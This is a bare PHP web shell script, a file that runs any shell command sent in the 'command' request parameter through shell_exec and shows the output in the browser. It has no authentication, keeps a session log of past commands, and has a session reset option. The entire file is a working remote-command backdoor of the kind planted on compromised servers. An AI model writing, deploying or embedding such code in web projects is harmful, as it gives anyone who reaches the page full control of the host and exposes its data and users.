<?php
session_start();
$command = @$_REQUEST['command'];
$run = @$_REQUEST['run'];
if($command!="")
{
	$c = explode(" ", $command);
	if($c[0]=="cd")
	{
		$_SESSION['cd'] = $c[1];
		echo "Directory Changed<br>";
	}
	if(!empty($_SESSION['cd']))
	{
		$cmd = @explode(" ",$_SESSION['command']);
		if($cmd[0]=="cd")
			chdir($_SESSION['cd']);
	}
	if($command=="cmdlog")
	{
		echo "<pre>";
		foreach(@$_SESSION['CommandLog'] as $k => $v)
		{
			echo "> ".$v."<br>";
		}
		echo "<br>";
	}
	else
		echo str_replace("\n","<br>",shell_exec($command))."<br>";

	$_SESSION['command'] = $command;
	$_SESSION['CommandLog'][] = $command;
}
elseif($run=="clean")
{
	$_SESSION['command'] = '';
	$_SESSION['CommandLog'] = array();
	$_SESSION['cd'] = '';
	if($_SESSION['command'] == '' AND $_SESSION['CommandLog'] == array() AND $_SESSION['cd'] == '')
	{
		echo "Session Cleaned";
	}else{
		echo "Error Cleaning Session";
	}
}else
{
	echo "";
}
?>